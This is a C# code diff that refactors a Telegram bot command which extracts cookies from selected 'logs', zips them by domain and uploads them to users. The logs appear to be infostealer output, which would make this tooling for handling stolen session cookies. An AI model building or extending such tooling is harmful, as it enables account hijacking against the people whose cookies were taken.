@@ -1,4 +1,6 @@
+using System.Net;
 using Core.Models.Configs;
+using Core.Models.Extensions;
 using Core.Parsers;
 using Microsoft.EntityFrameworkCore;
 using TelegramBot.Data;
@@ -17,10 +19,10 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
 {
     public bool AuthorizedOnly { get; } = true;
 
-    Task ICommand.Invoke(UpdateNewMessage update, User user) =>
-        client.SendMessageAvailableLogs(user, "Cookies\nSelect logs", data);
+    public Task Invoke(UpdateNewMessage update, User user) =>
+        client.SendAvailableLogs(user, "Cookies\nSelect logs", data);
 
-    async Task ICallbackCommand.Invoke(UpdateBotCallbackQuery update, User user)
+    public async Task Invoke(UpdateBotCallbackQuery update, User user)
     {
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
             { } logsname) return;
@@ -78,7 +80,7 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
             if (!Directory.Exists(dir)) return;
         }
 
-        var files = await ParseCookies(dir);
+        var files = await ParseCookies(dir).ToListAsync();
         
         await client.EditMessage(peer, messageId, $"Cookies\n{logsname} successfully processed");
         
@@ -100,25 +102,18 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
         await SaveFilesData(messages, logsname);
     }
 
-    private async Task<IEnumerable<InputFileBase>> ParseCookies(string logs)
-    {
-        var files = new List<InputFileBase>();
-        
-        foreach ((var cookie, var cookies) in cfgParse.Cookies.CookiesFromLogs(logs))
-        {
-            string path = await data.SaveZipAsync(
-                new DirectoryInfo(logs).Name,
-                "cookies",
-                cookie.Domains.First(),
-                cookies.ToArray(),
-                "Cookies");
-            
-            files.Add(await client.UploadFileAsync(path));
-        }
+    private IAsyncEnumerable<InputFileBase> ParseCookies(string logs) =>
+        cfgParse.Cookies.CookiesFromLogs(logs)
+                .ToAsyncEnumerable()
+                .SelectAwait(async x => 
+                    await data.SaveZipAsync(
+                        new DirectoryInfo(logs).Name,
+                        "cookies",
+                        x.Key.Domains.First(),
+                        x.Value.ToArray(),
+                        "Cookies"))
+                .SelectAwait(async path => await client.UploadFileAsync(path));
 
-        return files;
-    }
-    
     private async Task SaveFilesData(Message[] messages, string logsname)
     {
         var medias = messages
